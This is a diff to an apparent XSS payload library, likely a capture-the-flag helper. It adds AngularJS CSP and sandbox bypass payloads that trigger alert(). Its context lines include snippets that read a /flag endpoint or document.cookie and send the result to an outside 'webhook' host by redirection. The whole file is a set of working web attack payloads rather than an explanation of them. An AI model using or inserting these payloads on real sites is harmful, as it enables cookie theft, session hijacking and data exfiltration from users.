@@ -182,6 +182,12 @@ window.Payload.XSS = {
     vue3DynamicComponent: value => '<component is=script text=alert()>'  
   },
 
+  AngularJS: {
+    angularJS1_6WithPrototype$on: value => '<div ng-app ng-csp>{{$on.curry.call().alert()}}</div>',
+    // Author: Gareth Heyes (PortSwigger)
+    angularJSWith$event: value => `<div ng-app ng-csp><input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1], alert)'"></div>`
+  },
+
   snippets: {
     getSamesiteFlag: value => 'fetch(`/flag`).then(t=>t.text()).then(t=>location=`https://webhook/?f=`+encodeURIComponent(t))',
     getCookieFlag: value => 'location=`https://webhook/?f=`+encodeURIComponent(document.cookie)',
